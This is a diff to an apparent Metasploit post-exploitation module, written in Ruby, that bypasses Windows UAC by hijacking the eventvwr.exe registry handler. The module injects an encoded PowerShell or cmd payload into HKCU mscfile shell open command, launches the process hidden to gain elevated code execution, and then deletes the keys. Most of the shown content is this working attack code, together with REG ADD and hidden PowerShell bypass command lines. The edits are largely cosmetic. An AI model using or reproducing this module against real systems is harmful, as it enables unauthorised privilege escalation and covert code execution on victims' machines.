@@ -44,11 +44,6 @@
 # 'USE_POWERSHELL true' and input the base64 encoded 'shellcode' into 'EXEC_COMMAND'
 # EXAMPLE: set USE_POWERSHELL true
 # EXAMPLE: set EXEC_COMMAND aDfSjRnGlsWlDtBsQkGftmoEdD==
-#
-# command to be injected IF 'use_powershell true' its active:
-# %SystemRoot%\System32\WindowsPowershell\v1.0\powershell.exe -nop -wind hidden -Exec Bypass -noni -enc < EXEC_COMMAND >
-# command to be injected IF 'use_powershell false' its active:
-# %SystemRoot%\System32\cmd.exe /c < EXEC_COMMAND >
 # ---
 #
 #
@@ -81,6 +76,7 @@
 
 
 
+
 # ----------------------------
 # Module Dependencies/requires
 # ----------------------------
@@ -89,6 +85,7 @@ require 'msf/core'
 require 'msf/core/post/common'
 require 'msf/core/post/windows/priv'
 require 'msf/core/post/windows/registry'
+
 
 
 
@@ -102,6 +99,7 @@ class MetasploitModule < Msf::Post
          include Msf::Post::Windows::Priv
          include Msf::Post::Windows::Error
          include Msf::Post::Windows::Registry
+
 
 
 
@@ -121,7 +119,7 @@ class MetasploitModule < Msf::Post
                                         'Vuln discover : enigma0x3 | mattifestation', # credits
                                 ],
  
-                        'Version'        => '$Revision: 1.6',
+                        'Version'        => '$Revision: 1.7',
                         'DisclosureDate' => 'jan 8 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
@@ -166,8 +164,6 @@ class MetasploitModule < Msf::Post
 
 
 
-# check IF 'set use_powershell true' works (if reg key added)
-# check IF UAC set to dword 2 (always notify) will abort module execution
 # -------------------------------------------------------
 # GAIN REMOTE CODE EXCUTION BY HIJACKING EVENTVWR PROCESS
 # -------------------------------------------------------
@@ -198,7 +194,7 @@ def ls_stage1
     print_warning("Reading process registry hive keys...")
     Rex::sleep(1.0)
     if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
-      print_good("  exec => remote registry hive key found!")
+      print_good(" exec => remote registry hive key found!")
       Rex::sleep(1.0)
     else
       # registry hive key not found, aborting module execution.
@@ -230,7 +226,7 @@ def ls_stage1
         return nil
       else
         # all good in UAC settings :D
-        print_good("  exec => Target UAC set to: #{check_success} (exploitable)")
+        print_good(" exec => Target UAC set to: #{check_success} (exploitable)")
         Rex::sleep(1.0)
       end
 
@@ -240,24 +236,24 @@ def ls_stage1
         #
         if datastore['USE_POWERSHELL'] == true
           comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
-          print_good("  exec => Injecting shellcode(base64) string (powershell.exe)")
+          print_good(" exec => Injecting shellcode(base64) string (powershell.exe)")
           Rex::sleep(1.0)
         else
           comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
-          print_good("  exec => Injecting cmd command string (cmd.exe)")
+          print_good(" exec => Injecting cmd command string (cmd.exe)")
           Rex::sleep(1.0)
         end
 
  # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsgVkGftmoEdD==" /f
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
- print_good("  exec => Hijacking process to gain code execution...")
+ print_good(" exec => Hijacking process to gain code execution...")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit 'enigma0x3' :D
  Rex::sleep(4.5)
 
       # start remote service to gain code execution
-      print_good("  exec => Starting eventvwr.exe native process...")
+      print_good(" exec => Starting eventvwr.exe native process...")
       r = session.sys.process.execute("cmd.exe /c start #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
       Rex::sleep(1.0)
 
@@ -275,7 +271,6 @@ end
 
 
 
-# check IF #{reg_clean} has sucessefuly deleted value in regedit
 # ----------------------------------------------------
 # DELETE MALICIOUS REGISTRY ENTRY (process hijacking)
 # ----------------------------------------------------
@@ -313,7 +308,7 @@ def ls_stage2
 
  # Delete hijacking hive keys from target regedit...
  # REG DELETE HKCU\Software\Classes /f -> mscfile\shell\open\command
- print_good("  exec => Deleting HKCU hive registry keys...")
+ print_good(" exec => Deleting HKCU hive registry keys...")
  r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit
  Rex::sleep(3.0)
@@ -375,7 +370,7 @@ def ls_stage3
 
       # check target registry hive/key settings (hijacking key)
       if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
-        report_tw = "HIJACK HIVE PRESENT"
+        report_tw = "HIJACK HIVE ACTIVE"
       else
         vuln_key = "NOT FOUND"
         report_tw = "HIJACK HIVE NOT PRESENT"
@@ -421,7 +416,7 @@ def run
       # Variable declarations (msf API calls)
       oscheck = client.fs.file.expand_path("%OS%")
       sysnfo = session.sys.config.sysinfo
-      runtor = client.sys.config.getuid # <-- error in this key? why?
+      runtor = client.sys.config.getuid
       runsession = client.session_host
       directory = client.fs.dir.pwd
 
@@ -438,7 +433,7 @@ def run
     print_line("    Operative System    : #{sysnfo['OS']}")
     print_line("    Target IP addr      : #{runsession}")
     print_line("    Payload directory   : #{directory}")
-    print_line("    Client UID          : #{runtor}") # <-- error in this key? why?
+    print_line("    Client UID          : #{runtor}")
     print_line("")
     print_line("")
 
